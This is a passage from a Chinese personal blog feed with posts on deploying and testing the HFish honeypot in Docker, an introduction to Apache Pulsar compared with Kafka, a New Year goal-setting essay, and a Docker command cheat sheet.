挂载数据卷到宿主机上，避免容器删除数据丢失。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name hfish -p 21:21 -p 22:22 -p 23:23 -p 3306:3306 -p 6379:6379 -p 8080:8080 -p 8989:8989 -p 9000:9000 -p 9001:9001 -p 11211:11211 imdevops/hfish:latest</span><br></pre></td></tr></table></figure></p><p><strong>21 为 FTP 端口<br>22 为 SSH 端口<br>23 为 Telnet 端口<br>3306 为 Mysql 端口<br>6379 为 Redis 端口<br>8080 为 暗网 端口<br>8989 为 插件 端口<br>9000 为 Web 端口<br>9001 为 系统管理后台 端口<br>11211 为 Memcache 端口</strong></p><blockquote><p>以上端口根据实际需要决定是否打开，并注意端口冲突。</p></blockquote><h2 id="0X05-蜜罐功能展示"><a href="#0X05-蜜罐功能展示" class="headerlink" title="0X05 蜜罐功能展示"></a>0X05 蜜罐功能展示</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAyMDAyMDYvc05BM014dk1JZXV1LnBuZw?x-oss-process=image/format,png" alt="mark"><br><strong>找到虚拟机IP地址</strong><br>访问<strong><a href="http://192.168.0.122:9001" target="_blank" rel="noopener">http://192.168.0.122:9001</a></strong><br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAyMDAyMDYvbm83WGEzYTNlaWkzLnBuZw?x-oss-process=image/format,png" alt="mark"><br><strong>进入管理页面</strong><br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAyMDAyMDYvUDdOaENvM3gxYWs5LnBuZw?x-oss-process=image/format,png" alt="mark"></p><h2 id="0X06-蜜罐8080端口功能性测试"><a href="#0X06-蜜罐8080端口功能性测试" class="headerlink" title="0X06 蜜罐8080端口功能性测试"></a>0X06 蜜罐8080端口功能性测试</h2><p><strong>访问8080端口为WP登录页面</strong><br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAyMDAyMDYvcm1RVUZyNldFeW5uLnBuZw?x-oss-process=image/format,png" alt="mark"><br><strong>使用BurpSuite进行抓包爆破测试</strong><br><img src="https://img-blog.csdnimg.cn/20200206130035535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzMzYyMjk0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Sent to Intruder</strong><br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAyMDAyMDYvZlE1MzBsOUJNbUxHLnBuZw?x-oss-process=image/format,png" alt="mark"><br>选择账户<br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAyMDAyMDYvN3d4eGgwaHE0SndULnBuZw?x-oss-process=image/format,png" alt="mark"><br>选择密码<br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAyMDAyMDYvVUduczNPRmwwQm5XLnBuZw?x-oss-process=image/format,png" alt="mark"><br>开始爆破攻击<br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAyMDAyMDYvMTdDTUQ3QzFWM0VXLnBuZw?x-oss-process=image/format,png" alt="mark"><br>蜜罐后台数据显示<br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAyMDAyMDYveThISHg3am9vR2g5LnBuZw?x-oss-process=image/format,png" alt="mark"><br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAyMDAyMDYvclVnWVNHajk4U2djLnBuZw?x-oss-process=image/format,png" alt="mark"></p><h2 id="0X07-SSH蜜罐功能性测试"><a href="#0X07-SSH蜜罐功能性测试" class="headerlink" title="0X07 SSH蜜罐功能性测试"></a>0X07 SSH蜜罐功能性测试</h2><p><strong>利用Xshell进行连接蜜罐</strong></p><blockquote><p>因为端口冲突，我将虚拟机的24端口映射到22端口</p></blockquote><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAyMDAyMDYvOEFzVTVNY1NzV0RzLnBuZw?x-oss-process=image/format,png" alt="mark"><br><strong>蜜罐后台监控</strong><br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAyMDAyMDYvcW1mdVJpOHhCMnJlLnBuZw?x-oss-process=image/format,png" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;HFish&lt;/strong&gt;是一种基于&lt;strong&gt;Golang&lt;/strong&gt;开发的跨平台多功能主动诱导型开源蜜罐框架系统，为企业安全防护所做的精心打造，全程记录黑客攻击手段，实现防护自主化。&lt;/p&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://austfish.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="蜜罐" scheme="http://austfish.cn/tags/%E8%9C%9C%E7%BD%90/"/>
    
  </entry>
  
  <entry>
    <title>下一代分布式消息队列-Pulsar</title>
    <link href="http://austfish.cn/2020/01/09/%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%88%86%E5%B8%83%E5%BC%8F%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97-Pulsar/"/>
    <id>http://austfish.cn/2020/01/09/下一代分布式消息队列-Pulsar/</id>
    <published>2020-01-09T08:22:06.000Z</published>
    <updated>2022-02-18T03:34:21.530Z</updated>
    
    <content type="html"><![CDATA[<p>Apache Pulsar是一个企业级的分布式消息系统，最初由Yahoo开发并在2016年开源，目前正在Apache基金会下孵化。Plusar已经在Yahoo的生产环境使用了三年多，主要服务于Mail、Finance、Sports、 Flickr、 the Gemini Ads platform、 Sherpa以及Yahoo的KV存储。<br><a id="more"></a></p><h2 id="Pulsar简介"><a href="#Pulsar简介" class="headerlink" title="Pulsar简介"></a>Pulsar简介</h2><p>Pulsar之所以能够称为下一代消息队列，主要是因为以下特性:</p><ul><li>Pulsar实例原生支持多集群，能无缝的基于地理位置进行跨集群备份</li><li>非常低的消息发布和端到端的延迟</li><li>无缝扩展到超过百万个topic</li><li>支持Java,Go,Pytho和C++的客户端Topic</li><li>支持多种订阅模式: 独占（exclusive）, 共享（shared）和灾备（failover）</li><li>通过Apache BookKeeper提供的持久化消息存储机制保证消息的送达</li><li>serverless的轻量级计算框架Pulsar Functions提供了原生的流数据处理</li><li>serverless的连接器框架Pulsar IO构建于 Pulsar Functions之上，能够轻松的将数据从Pulsar中移入和移出</li><li>当数据老化时，分层存储将数据从热存储卸载到冷存储（如S3和GCS）</li></ul><h2 id="架构概述"><a href="#架构概述" class="headerlink" title="架构概述"></a>架构概述</h2><p>从最上层来看，一个Plusar单元由若干个集群组成，单元内的集群可以互相之前复制数据, plusar中通常有以下几种组件:</p><ul><li><strong>Broker</strong>:负责处理Producer发来的消息并分发给消费者。通过一个全局的ZK集群来处理多种协作式任务，例如说基于地理位置的复制。并将消息存储到BookKeeper中，同时单个集群内也需要有一套ZK集群，来存储一些元数据。</li><li><strong>BookKeeper集群</strong>: 内部包含多个bookies，用于持久化消息。</li><li><strong>ZooKeeper集</strong><br><img src="http://qiniu.austfish.cn/blog/20200108/eiivIHMeeC4U.png?imageslim" alt="mark"></li></ul><h3 id="Broker"><a href="#Broker" class="headerlink" title="Broker"></a>Broker</h3><p>在Kafka和RocketMQ中，Broker负责消息数据的存储以及consumer消费位移的存储等，而Plusar中的broker和他们两个有所不同，plusar中的broker是一个无状态的节点，主要负责三件事情：</p><ul><li>暴露REST接口用于执行管理员的命令以及topic所有者的查询等</li><li>一个用于节点间通讯的异步的TCP服务器，协议目前采用的是Google之前开源的Protocol Buffer</li><li>为了支持地域复制，broker会将自己 集群所在的消息发布到其他可用区。</li></ul><p>消息会被先发布到BookKeeper中，然后会在Broker本地内存中缓存一份，因此一般来说消息的读取都会从从内存中读取，因此第一条中所说的查找topic所有者就是说，因为BookKeeper中的一个ledger只允许一个writer，因此我们可以调用rest接口获取到某一个topic当前的所有者。</p><h3 id="BookKeeper"><a href="#BookKeeper" class="headerlink" title="BookKeeper"></a>BookKeeper</h3><p>BookKeeper是一个可横向扩展的、错误容忍的、低延迟的分布式存储服务，BookKeeper中最基本的单位是记录，实际上就一个字节数组，而记录的数组称之为ledger，BK会将记录复制到多个bookies，存储ledger的节点叫做bookies，从而获得更高的可用性和错误容忍性。从设计阶段BK就考虑到了各种故障，Bookies可以宕机、丢数据、脏数据，但是主要整个集群中有足够的Bookies服务的行为就是正确的。</p><p>在Pulsar中，每个分区topic是由若干个ledger组成的，而ledger是一个append-only的数据结构，只允许单个writer，ledger中的每条记录会被复制到多个bookies中，一个ledger被关闭后(例如broker宕机了或者达到了一定的大小)就只支持读取，而当ledger中的数据不再需要的时候(例如所有的消费者都已经消费了这个ledger中的消息)就会被删除.<br><img src="http://qiniu.austfish.cn/blog/20200108/1DJdy2fmLJfG.png?imageslim" alt="mark"></p><p>Bookkeeper的主要优势在于它可以保证在出现故障时在ledger的读取一致性。因为ledger只能被同时被一个writer写入，因为没有竞争，BK可以更高效的实现写入。在Broker宕机后重启时，Plusar会启动一个恢复的操作，从ZK中读取最后一个写入的Ledger并读取最后一个已提交的记录，然后所有的消费者也都被保证能看到同样的内容。<br><img src="http://qiniu.austfish.cn/blog/20200108/zSXRDnlkktm6.png?imageslim" alt="mark"></p><p>我们知道Kafka在0.8版本之前是将消费进度存储到ZK中的，但是ZK本质上基于单个日志的中心服务，简单来讲，ZK的性能不会随着你增加更多的节点而线性增加，会只会相反减少，因为更多的节点意味着需要将日志同步到更多的节点，性能也会随之下降，因此QPS也会受单机性能影响，因此0.8版本之后就将消费进度存储到了Kafka的Topic中，而RocketMQ最初的版本也类似，有几种不同的实现例如ZK、数据库等，目前版本采用的是存储到本机文件系统中，而Plusar采用了和Kafka类似的思想，Plusar将消费进度也存储到了BK的ledger中。</p><h3 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h3><p>Plusar中的元数据主要存储到ZK中，例如不同可用区相关的配置会存在全局的ZK中，集群内部的ZK用于存储例如某个topic的数据写入到了那些Ledger、Broker目前的一些埋点数据等等</p><h2 id="Plusar核心概念"><a href="#Plusar核心概念" class="headerlink" title="Plusar核心概念"></a>Plusar核心概念</h2><h3 id="Topic"><a href="#Topic" class="headerlink" title="Topic"></a>Topic</h3><p>发布订阅系统中最核心的概念是topic，简单来说，topic可以理解为一个管道，producer可以往这个管道丢消息，consumer可以从这个管道的另一端读取消息，但是这里可以有多个consumer同时从这个管道读取消息。<br><img src="http://qiniu.austfish.cn/blog/20200108/OTOBMa8GIMbj.png?imageslim" alt="mark"></p><p>每个topic可以划分为多个分区，同一个topic下的不同分区所包含的消息都是不同的。每个消息在被添加到一个分区后都会分配一个唯一的offset，在同一个分区内消息是有序的，因此客户端可以根据比如说用户ID进行一个哈希取模从而使得整个用户的消息都发往整个分区，从而一定程度上避免race condition的问题。通过分区，将大量的消息分散到不同的节点处理从而获得高吞吐。默认情况下，plusar的topic都是非分区的，但是支持通过cli或者接口创建一定分区数目的topic<br><img src="http://qiniu.austfish.cn/blog/20200108/ggjjtTxiXh8p.png?imageslim" alt="mark"></p><p>默认情况下Plusar会自动均衡Producer和Consumer,但有时候客户端想要根据自己的业务规则也进行路由，Plusar默认支持以下几种规则:单分区、轮询、哈希、自定义(即自己实现相关接口来定制路由规则)</p><h3 id="消费模式"><a href="#消费模式" class="headerlink" title="消费模式"></a>消费模式</h3><p>消费决定了消息具体是如何被分发到消费者的，Plusar支持几种不同的消费模式: exclusive、shared、failover。图示如下:<br><img src="http://qiniu.austfish.cn/blog/20200108/pvR3ccVRrKCy.png?imageslim" alt="mark"></p><ul><li><strong>Exclusive</strong>: 一个topic只能被一个消费者消费。Plusar默认就是这个模式<br><img src="http://qiniu.austfish.cn/blog/20200108/NlCt0330q1dW.png?imageslim" alt="mark"></li><li><strong>Shared</strong>: 共享模式或者叫轮询模式，多个消费者可以连接到同一个topic，消息被依次分发给消费者，当一个消费者宕机或者主动断开连接，那么发到那个消费者的还没有ack的消息会得到重新调度分发给其他消费者。<br><img src="http://qiniu.austfish.cn/blog/20200108/7IHRn8im495s.png?imageslim" alt="mark"></li><li><strong>Failover</strong>: 多个消费者可以连接同一个topic并按照字典序排序，第一个消费者会开始消费消息，称之为master，当master断开连接，所有未ack和队列中剩下的消息会分发给另一个消费者。<br><img src="http://qiniu.austfish.cn/blog/20200108/vvGDAIxetu3f.png?imageslim" alt="mark"></li></ul><p>Plusar目前也支持另一种Reader接口，支持传入一个消息ID，例如说Message.Earliest来从最早的消息开始消费。</p><h2 id="Kafka与Pulsar异同"><a href="#Kafka与Pulsar异同" class="headerlink" title="Kafka与Pulsar异同"></a>Kafka与Pulsar异同</h2><p>pulsar和kafka最显而易见的区别是，pulsar支持多租户，有着资产和命名空间的概念，资产代表系统里的租户。假设有一个Pulsar集群用于支持多个应用程序（就像Yahoo那样），集群里的每个资产可以代表一个组织的团队、一个核心的功能或一个产品线。一个资产可以包含多个命名空间，一个命名空间可以包含任意个主题。</p><p><img src="http://qiniu.austfish.cn/blog/20200108/rSiJQ640PaK2.png?imageslim" alt="mark"></p><table><thead><tr><th></th><th>Kafka</th><th>Pulsar</th></tr></thead><tbody><tr><td>概念</td><td>生产者 - 主题 - 消费者群体 - 消费者</td><td>生产者 - 主题 - 订阅 - 消费者</td></tr><tr><td>消费</td><td>更专注于分区上的流式传输、独占消息传递，没有共享消费。</td><td>统一消息传递模型和API。1通过独占的故障转移订阅进行流式传输 2通过共享订阅队列</td></tr><tr><td>Acking</td><td>简单的偏移offset管理 1在Kafka 0.8之前，偏移量存储在ZooKeeper中 2在Kafka 0.8之后，偏移量存储在偏移主题上</td><td>统一消息传递模型和API。通过独占的故障转移订阅进行流式传输通过共享订阅队列</td></tr><tr><td>Retention</td><td>根据保留删除消息，如果消费者在保留期之前未读取消息，则会丢失数据。</td><td>1消息仅在所有订阅消耗后删除，即使订阅的消费者长时间down，也没有数据丢失。2即使所有订阅都使用消息，也允许消息保留一段配置的保留期。</td></tr><tr><td>TTL</td><td>没有TTL支持</td><td>支持消息TTL</td></tr></tbody></table><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Plusar作为下一代分布式消息队列，拥有非常多吸引人的特性，也弥补了一些其他竞品的短板，例如地域复制、多租户、扩展性、读写隔离等等。</p><h2 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h2><p>Pulsar Function 上传</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./bin/pulsar-admin functions create \</span><br><span class="line">--py mg_function.py \</span><br><span class="line">--inputs persistent://public/default/honeypots \</span><br><span class="line">--output persistent://public/default/honeypots-2 \</span><br><span class="line">--calssname mg_function.ExclamationFunction</span><br></pre></td></tr></table></figure><p>Pulsar Function 启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bin/pulsar-admin functions localrun \</span><br><span class="line">--py mg_function.py \ </span><br><span class="line">--classname mg_function.ExclamationFunction \ </span><br><span class="line">--inputs persistent://public/default/honeypots \ </span><br><span class="line">--output persistent://public/default/honeypots-2</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Apache Pulsar是一个企业级的分布式消息系统，最初由Yahoo开发并在2016年开源，目前正在Apache基金会下孵化。Plusar已经在Yahoo的生产环境使用了三年多，主要服务于Mail、Finance、Sports、 Flickr、 the Gemini Ads platform、 Sherpa以及Yahoo的KV存储。&lt;br&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://austfish.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="手册" scheme="http://austfish.cn/tags/%E6%89%8B%E5%86%8C/"/>
    
  </entry>
  
  <entry>
    <title>2020必须是突破的一年</title>
    <link href="http://austfish.cn/2020/01/02/2020%E5%BF%85%E9%A1%BB%E6%98%AF%E7%AA%81%E7%A0%B4%E7%9A%84%E4%B8%80%E5%B9%B4/"/>
    <id>http://austfish.cn/2020/01/02/2020必须是突破的一年/</id>
    <published>2020-01-02T02:06:28.000Z</published>
    <updated>2022-02-18T03:34:20.142Z</updated>
    
    <content type="html"><![CDATA[<p>塞尔维亚的僧侣撒迪厄斯说：“我们的想法决定我们的生活。”<br>无论是积极的信念还是消极的信念，都会对生活经历产生巨大影响。明白这个事实，就代表你已经迈上了最好的一年的第一级台阶。<br><a id="more"></a></p><h2 id="0X01-只有相信可能，一切才更有可能"><a href="#0X01-只有相信可能，一切才更有可能" class="headerlink" title="0X01 只有相信可能，一切才更有可能"></a>0X01 只有相信可能，一切才更有可能</h2><p>塞尔维亚的僧侣撒迪厄斯说：“我们的想法决定我们的生活。”</p><p>无论是积极的信念还是消极的信念，都会对生活经历产生巨大影响。明白这个事实，就代表你已经迈上了最好的一年的第一级台阶。</p><p><u><strong>期待什么，就很可能经历什么！</strong></u></p><p>我们都会有对世界、他人、自己的自我设限性观念。在设立目标前，要识别出自我设限性观念的来源，即你的自我设限性观念是来自过去的经验、新闻媒体、社交媒体，还是负面的关系。</p><p>其实，<u><strong>我们面对的大多数阻碍，都只存在于想象之中</strong></u>。拿出笔记本或一沓纸，在一页纸中间画一条竖线，将其分为两栏，把自我设限性观念升级成自我开放性观念。</p><table><thead><tr><th>自我设限性观念</th><th>自我开放性观念</th></tr></thead><tbody><tr><td>我的经验不足</td><td>我对这件事依旧有着新鲜感，能保持活力</td></tr><tr><td>我的年龄大了</td><td>我经验丰富，遇到一些事看法更全面</td></tr><tr><td>事情太复杂，我看不懂</td><td>理清这件事，我就能获得成长</td></tr><tr><td>经济压力，我接受不</td><td>不仅有收入提升，自己也会多一次项目经历</td></tr></tbody></table><p>当你把一些自我设限的观念转为自我开放性的观念之后，你会发现其实自己已经具备了很多的优点，也能够为以往不可能实现的目标找到新的突破口。</p><p>其实，你没有自己想得那么普通，我们拥有的能力都比我们以为的要多。</p><p>根据斯坦福大学心理学教授阿尔伯特·班杜拉的研究，这种能力包含的四种属性能够帮助我们实现目标。</p><p><strong>第一，意图。我们可以想象一种比现在更好的生活，并在现有条件下通过与他人共同努力获得这种生活。</strong><br><strong>第二，前瞻。通过预见未来，约束自己当前的行为，并用目的和意义来指导行动。</strong><br><strong>第三，行动。我们有能力按照我们的计划行事，保持积极性，并通过随机应变保证计划按时进行。</strong><br><strong>最后，内省。我们不仅会行动、对行动进行评估，能够调整行动，甚至修改计划。</strong></p><p>不要怀疑自己的能力，也要认定自己现有资源不够多。<u><strong>资源从来不是我们实现目标过程中的主要挑战</strong></u>。有限的资源能够塑造人的人的适应性和自信心，当你克服的困难次数越多，克服下一个困难的能力就越强。<br>不管我们处于什么样的环境，我们都有能力追求更好的未来。</p><h2 id="0X02-总结过去，才能让眼光看向未来"><a href="#0X02-总结过去，才能让眼光看向未来" class="headerlink" title="0X02 总结过去，才能让眼光看向未来"></a>0X02 总结过去，才能让眼光看向未来</h2><p>就像汽车有后视镜一样，后向思考会给我带来前进的方向，回顾过去才能更好地展望未来。</p><h5 id="事后回顾分为四个步骤："><a href="#事后回顾分为四个步骤：" class="headerlink" title="事后回顾分为四个步骤："></a>事后回顾分为四个步骤：</h5><p>1、陈述理想结果；<br>2、承认实际结果；<br>3、从经验中学习；<br>4、调整行为。</p><h5 id="试着回答一下以下7个问题吧。"><a href="#试着回答一下以下7个问题吧。" class="headerlink" title="试着回答一下以下7个问题吧。"></a>试着回答一下以下7个问题吧。</h5><ol><li>你如何看待过去的一年？</li><li>你在过去一年有什么计划、梦想，以及明确的目标？</li><li>你在过去一年中有什么失意或者遗憾？</li><li>过去的一年中，有没有你认为，自己应该被认可却没有被认可的时候？</li><li>过去一年中最让你自豪的成就是什么？</li><li>有没有两三个反复出现的主题？</li><li>你在过去一年中学到了什么重要的经验教训？</li></ol><p>当采取积极补救措施的可能性越大，你遗憾的感觉就越强烈。所以，问问自己，你的遗憾中隐藏着什么机会。</p><p>此外你也要懂得运用感恩的力量，其实，世界上有很多东西我们都无法得到。不管现在过得好不好，我们都拥有属于自己的资产，只要我们怀着感恩的心态去看待现在，就会发现我们所拥有的比想象中要多得多。</p><p>感恩可以让你远离恐惧感和失败感，从而获得成就、愉悦以及满足。</p><h2 id="0X03-设计未来，运用SMARTER原则"><a href="#0X03-设计未来，运用SMARTER原则" class="headerlink" title="0X03 设计未来，运用SMARTER原则"></a>0X03 设计未来，运用SMARTER原则</h2><p>从过去获得前行的力量后，接下来，我们就要规划未来了。<br>究竟每年应该设立多少个目标比较合适？</p><p><u><strong>我的建议是7到10个目标，且目标要满足SMARTER原则：</strong></u></p><p><strong>Specific:明确性 Measurable:可衡量性 Actionable:可行性 Risky:风险性 Time-Keyed:定时性 Exciting:激励性 Relevant:相关性</strong></p><ul><li>S是指具体和简单，对目标达成后的一些感受，目标要用最简洁的语言去让周围的人清楚明了；</li><li>M是要有数据可衡量，是自己强烈渴望的，自己采取措施或者多种途径能实现目标；</li><li>A是认为目标是可以实现的，对生活的方方面面都有影响，想象目标正进行或者实现；</li><li>R是正确认清现实，去分析它的负面影响和积极影响，负起自己应尽的责任；</li><li>T是设定截止日期，专注于自己想要的东西；</li><li>E是平衡自己的生活，与健康、交际和整个社会相关联，与A相互回应；</li><li>R是整合自己拥有的，包括金钱、时间和人脉，以及自己目前的能力。</li></ul><p>你需要根据不同的生活领域制定相应的目标，并且将目标分散到各个季度，以保证注意力集中以及全年节奏稳定。<br><u><strong>最好的事往往发生在我们不得不成长的时候。</strong></u>承认走出舒适区的价值，只要你接受了挑战区的价值，接下来的事就简单多了。随后直面痛苦，并克服恐惧。</p><p>恐惧的时候怎么办？</p><p>这个时候，你可以将实现目标带来的成就感和负面情绪进行对比，不难发现，与成就相比，那些恐惧可以说是微不足道。<br>此外，<u><strong>不要去制定过分详细的计划，这样很容易发展成变相的拖延。</strong></u>你不需要在开头就看到结尾，也不需要知道目标实现的整个过程，只需要清楚自己下一步应该做什么就够。</p><h2 id="0X04-找到动力，你才能坚持实现你的目标"><a href="#0X04-找到动力，你才能坚持实现你的目标" class="headerlink" title="0X04 找到动力，你才能坚持实现你的目标"></a>0X04 找到动力，你才能坚持实现你的目标</h2><p>每个星期，有种想法都不止一次出现在我的脑海——放弃。</p><p>我相信你也会跟我一样，会在运动的时候想着停下，面对挑战的时候想过放弃。</p><p>而目标迟迟不能实现会让人失去动力，于是我们需要运用动机，将收获与习惯联系在一起，「一周跑6天」可能不是目标，但是「10月31日前瘦10斤」这样的目标，能够帮助你早起，帮助你养成运动的习惯。</p><p>你要识别自己的动机，找张纸，一一列出产生目标的主要动机，并且给它们排个序，把最值得的理由写在最前面。 用脑子去想，用心去体会，不忘初心。</p><p><u><strong>一旦失去动机，人们也失去方向。</strong></u><br>任何重要的事情都需要努力，有些行动很难立竿见影，也一定不会一蹴而就，成功并非我们所期待的那样简单。要知道新习惯不是几个礼拜就能养成的，「21天法则」太过笼统，伦敦大学研究院表明，<u><strong>要想让新习惯成为自然而然的事情，平均下来需要66天，有些习惯，甚至需要250天！</strong></u></p><p>成功需要帮助，有时候还需要不少。使用一些养成型软件和日历薄，可以给你的大脑减负，毕竟你真的没有办法时时记住并且执行你的目标。</p><p>若是和有共同目标的团体或个人一起同行，参与学习小组等，与他人相互监督，会有助于你达成目标。</p><h2 id="0X05-付诸实践，别多想，马上开始行动"><a href="#0X05-付诸实践，别多想，马上开始行动" class="headerlink" title="0X05 付诸实践，别多想，马上开始行动"></a>0X05 付诸实践，别多想，马上开始行动</h2><p>其实，马拉松选手并不是一开始给自己设定全程40多公里的目标，而是将赛程拆解成一小段一小段地去完成小目标。</p><p>因此，<u><strong>拆解目标很重要。</strong></u>先完成最简单的任务，遇到困难的时候一定要向外界寻求帮助，因为快速地取得初步成功，才能够为后续行动带来动力。</p><p>在实践过程中，<u><strong>可以利用杠杆效应，借助简单的任务完成困难的任务。</strong></u>不要去依靠自己的即时自控力，给自己的大脑减轻一些负担。</p><p><u><strong>只要做，</strong></u><br><u>就要比完美无缺地待着要好得多。</u></p><p>在追求目标的过程中，遇到干扰事项、阻碍计划完成也是在所难免的，这时候，你需要先想好应对策略，预置回应。如果应对策略效果不佳，则调整到满意为止。</p><p>忘记目标其实也是常事，谁能保证时时刻刻都专注在一件事情上呢？</p><p><u><strong>定期回顾目标也非常重要。</strong></u>每日浏览目标列表，确保心中有目标，并在浏览时思考当天的具体任务。</p><p>切记，<u><strong>你的精力和时间都是有限的，任务不是越多越好，安排不是越满越显得你更高效。</strong></u>重要的任务不要太多，3个就够。在每周回顾中重点关注主要动机，用「每周三大事」来指导「每日三大事」，这样你的行动就不会出现过多的偏移了。</p><p>在季度回顾时，可以用「5步实现新年目标」的方法进行审视。</p><p>重点如下：</p><p><u><strong>1. 如果已经取得完全或者阶段性的胜利，就庆祝自己胜利</strong></u><br><u><strong>2. 如果还没有取得任何形式的胜利，就重新开始追求目标</strong></u><br><u><strong>3. 如果不能重新开始，就修改目标</strong></u><br><u><strong>4. 如果不能修改，就删除目标</strong></u><br><u><strong>5. 用新目标替代被删除的目标</strong></u></p><p>目标越大，在漫长过程中对小成就的庆祝就越关键，这是对努力的认可。</p><p>所以，当你有了一定的成果，千万不要吝啬给自己奖励与肯定，让胜利带来的愉悦渗透进紧绷的神经，给你继续前行的力量！</p><p><u><strong>马上行动，现在就开始你最好的一年！</strong></u><br><u><strong>翻篇了！</strong></u><br><u><strong>今年必须是突破的一年！</strong></u></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;塞尔维亚的僧侣撒迪厄斯说：“我们的想法决定我们的生活。”&lt;br&gt;无论是积极的信念还是消极的信念，都会对生活经历产生巨大影响。明白这个事实，就代表你已经迈上了最好的一年的第一级台阶。&lt;br&gt;
    
    </summary>
    
    
      <category term="生活" scheme="http://austfish.cn/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="计划" scheme="http://austfish.cn/tags/%E8%AE%A1%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>docker使用手册</title>
    <link href="http://austfish.cn/2019/12/18/docker%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/"/>
    <id>http://austfish.cn/2019/12/18/docker使用手册/</id>
    <published>2019-12-18T07:47:59.000Z</published>
    <updated>2022-02-18T03:34:20.273Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下docker的日常使用命令，本文主要针对linux + mac操作系统而言，window是否适用不太确定，谨慎使用</p><a id="more"></a><hr><h2 id="1-docker进程"><a href="#1-docker进程" class="headerlink" title="1. docker进程"></a>1. docker进程</h2><p>docker进程启动、停止、重启，常见的三种case</p><p> <strong>启动docker</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure><p><strong>关机docker</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker stop</span><br></pre></td></tr></table></figure><p><strong>重启docker</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure><h2 id="2-镜像操作"><a href="#2-镜像操作" class="headerlink" title="2. 镜像操作"></a>2. 镜像操作</h2><p>镜像作为容器执行的前提条件，一般需要掌握的几个命令无非是搜索，下载，删除，创建</p><p><strong>镜像列表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p><strong>检索镜像, 从镜像仓库中检索</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search xxx</span><br></pre></td></tr></table></figure><p><strong>下载镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull xxx</span><br></pre></td></tr></table></figure><p><strong>删除镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi xxx</span><br></pre></td></tr></table></figure><p>关于创建镜像，有必要稍微详细一点点</p><p><strong>通过容器创建镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -m=&quot;首次提交&quot; -a=&quot;一灰灰Blog&quot; dd85eb055fe8 yh/centos:v0.1</span><br></pre></td></tr></table></figure><p><strong>镜像历史查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker history yh/centos</span><br></pre></td></tr></table></figure><p>上面的几个参数进行说明</p><blockquote><p>-m 和git的提交一样，后面跟上描述信息<br>-a 版权声明，这个东西是我创建的，有啥问题，找我 dd85eb055fe8 容器id yhh/quick-os:0.1 